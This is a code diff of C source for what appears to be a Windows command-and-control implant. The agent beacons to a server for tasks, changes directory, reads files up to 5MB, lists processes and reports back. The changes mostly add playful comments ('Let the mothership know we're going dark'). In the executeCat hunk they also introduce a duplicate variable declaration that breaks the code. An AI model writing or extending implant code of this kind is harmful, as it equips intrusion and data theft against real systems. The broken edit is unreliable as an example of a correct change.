@@ -6,6 +6,7 @@
 
 BOOL routine()
 {
+    // Check C2 for any waiting orders
     LOG("[*] routine: Asking for new tasks...");
     PPackage getTask = PackageCreate();
     if (!getTask) return FALSE;
@@ -43,6 +44,7 @@ BOOL routine()
         }
     }
 
+    // Hide in plain sight... zzz
     LOG("[*] routine: Sleeping %d ms...", sleepMs);
     Sleep(sleepMs); 
 
@@ -57,7 +59,7 @@ BOOL commandDispatch(PParser response)
     LOG("[*] commandDispatch: Response type: 0x%02X", typeResponse);
     
     if (typeResponse == GET_TASKING)
-        return handleGetTasking(response);
+        return handleGetTasking(response); // Got work to do!
 
     return TRUE;
 }
@@ -345,6 +347,7 @@ BOOL executeExit(PParser arguments)
             LOG("[*] Task UUID: %s", taskUuid);
 
             // Send response saying we are dying
+            // Let the mothership know we're going dark
             PPackage responseTask = PackageCreate();
             PackageAddByte(responseTask, POST_RESPONSE);
             PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
@@ -410,7 +413,7 @@ BOOL executeCd(PParser arguments)
             
             if (SetCurrentDirectory(path))
             {
-                // Send success + new path
+                // Success! Let's tell the boss where we are now.
                 CHAR currentDir[MAX_PATH];
                 if (GetCurrentDirectory(MAX_PATH, currentDir))
                 {
@@ -502,7 +505,8 @@ BOOL executeCat(PParser arguments)
             if (hFile != INVALID_HANDLE_VALUE)
             {
                 DWORD fileSize = GetFileSize(hFile, NULL);
-                if (fileSize > 0 && fileSize < 1024 * 1024 * 5) // Limit to 5MB
+                DWORD fileSize = GetFileSize(hFile, NULL);
+                if (fileSize > 0 && fileSize < 1024 * 1024 * 5) // Cap at 5MB to avoid eating all RAM
                 {
                     PBYTE fileBuf = (PBYTE)LocalAlloc(LPTR, fileSize + 1);
                     if (fileBuf)
@@ -613,6 +617,7 @@ BOOL executePs(PParser arguments)
 
     LOG("[*] Enumerating processes...");
     
+    // Smile for the camera! Creating snapshot.
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot != INVALID_HANDLE_VALUE)
     {
